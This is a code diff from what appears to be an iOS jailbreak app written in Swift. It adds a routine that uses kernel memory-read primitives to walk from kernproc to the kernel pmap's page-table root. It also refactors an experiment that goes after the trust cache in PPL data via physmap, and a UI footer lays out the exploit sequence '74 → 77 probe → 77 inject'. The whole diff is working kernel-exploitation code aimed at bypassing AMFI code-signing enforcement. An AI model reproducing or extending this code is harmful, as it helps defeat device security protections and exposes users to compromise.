@@ -82,6 +82,79 @@ private enum PhysmapConstants {
     }
 }
 
+// MARK: - Kernel pmap (for page table walks on kernel VA)
+
+private struct KernelPmapChain {
+    let kernProc: UInt64
+    let task: UInt64
+    let vmMap: UInt64
+    let pmap: UInt64
+    let tte: UInt64
+}
+
+/// Page table root for kernel virtual addresses — must use kernproc, not our_proc.
+private func resolveKernelPmapChain(detail: inout String) -> KernelPmapChain? {
+    let kernProc = ds_get_kern_proc()
+    guard kernProc != 0 else {
+        detail += "❌ ds_get_kern_proc() failed (check offsets / kernproc symbol)\n"
+        return nil
+    }
+    detail += "kernproc: 0x\(String(format: "%llx", kernProc))\n"
+
+    let task = taskbyproc(kernProc)
+    guard task != 0 else {
+        detail += "❌ taskbyproc(kernproc) failed\n"
+        return nil
+    }
+    detail += "kernel task: 0x\(String(format: "%llx", task))\n"
+
+    var vmMap = task_get_vm_map(task)
+    if vmMap == 0 {
+        for off: UInt64 in [0x28, 0x30, 0x20, 0x38, 0x40] {
+            let c = ds_kread64_safe(task + off)
+            if c > 0xffffffdc00000000 && c < 0xffffffe500000000 {
+                let fwd = ds_kread64_safe(c + 0x10)
+                if fwd != 0 {
+                    vmMap = c
+                    detail += "kernel vm_map (scan +0x\(String(format: "%x", off))): 0x\(String(format: "%llx", c))\n"
+                    break
+                }
+            }
+        }
+    } else {
+        detail += "kernel vm_map (off_task_map): 0x\(String(format: "%llx", vmMap))\n"
+    }
+
+    guard vmMap != 0 else {
+        detail += "❌ kernel vm_map not found\n"
+        return nil
+    }
+
+    var pmap: UInt64 = 0
+    for off: UInt64 in [0x48, 0x50, 0x58, 0x40] {
+        let p = ds_kread64_safe(vmMap + off)
+        if p != 0 && p > 0xffffffdc00000000 {
+            pmap = p
+            detail += "kernel pmap (+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", p))\n"
+            break
+        }
+    }
+
+    guard pmap != 0 else {
+        detail += "❌ kernel pmap not found on vm_map\n"
+        return nil
+    }
+
+    let tte = ds_kread64_safe(pmap)
+    guard tte > 0xffffffd000000000 else {
+        detail += "❌ kernel tte invalid: 0x\(String(format: "%llx", tte))\n"
+        return nil
+    }
+    detail += "kernel tte (L1 root): 0x\(String(format: "%llx", tte))\n\n"
+
+    return KernelPmapChain(kernProc: kernProc, task: task, vmMap: vmMap, pmap: pmap, tte: tte)
+}
+
 struct AMFIExperimentView: View {
     @ObservedObject private var root = RootExecutor.shared
     @ObservedObject private var mgr = dspmgr.shared
@@ -168,7 +241,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("Exp 74 pakai KRW saja (tanpa launchd) agar aman. Urutan: 74 → 77 probe → 77 inject. Jangan tutup app saat berjalan.")
+                Text("Fokus: Full jailbreak via physmap. Urutan 74 → 77 probe → 77 inject. Exp 74/77 probe = KRW-only. Jangan tutup app saat berjalan.")
                     .font(.system(size: 9))
             }
 
@@ -3909,48 +3982,15 @@ struct AMFIExperimentView: View {
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
         
         // ============================================================
-        // STEP 1: Get kernel pmap's L1 table base (tte)
-        // We already know: task→vm_map(+0x30)→pmap(+0x50)→tte(+0x00)
-        // The kernel pmap's tte gives us the page table root
+        // STEP 1: Kernel pmap L1 (tte) — MUST be kernproc, not our_proc
         // ============================================================
-        detail += "=== Step 1: Get kernel page table root (tte) ===\n"
-        
-        let ourProc = ds_get_our_proc()
-        let taskAddr = taskbyproc(ourProc)
-        
-        guard taskAddr != 0 else {
-            detail += "❌ taskbyproc failed\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
-        
-        // Find vm_map at task+0x28 or task+0x30
-        var vmMap: UInt64 = 0
-        for off: UInt64 in [0x28, 0x30, 0x20, 0x38] {
-            let candidate = ds_kread64_safe(taskAddr + off)
-            if candidate > 0xffffffdc00000000 && candidate < 0xffffffe500000000 {
-                let hdrFwd = ds_kread64_safe(candidate + 0x10)
-                if hdrFwd != 0 {
-                    vmMap = candidate
-                    detail += "vm_map at task+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate))\n"
-                    break
-                }
-            }
-        }
-        
-        guard vmMap != 0 else {
-            detail += "❌ vm_map not found\n"
+        detail += "=== Step 1: Kernel page table root (kernproc pmap) ===\n"
+
+        guard let kPmap = resolveKernelPmapChain(detail: &detail) else {
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        let pmapPtr = ds_kread64_safe(vmMap + 0x50)
-        let tteBase = ds_kread64_safe(pmapPtr + 0x00)
-        detail += "pmap: 0x\(String(format: "%llx", pmapPtr))\n"
-        detail += "tte (L1 base VA): 0x\(String(format: "%llx", tteBase))\n\n"
-
-        guard tteBase > 0xffffffd000000000 else {
-            detail += "❌ tte invalid\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        let tteBase = kPmap.tte
         
         // ============================================================
         // STEP 2: Find trust cache in __DATA.__ppl_data via physmap READ
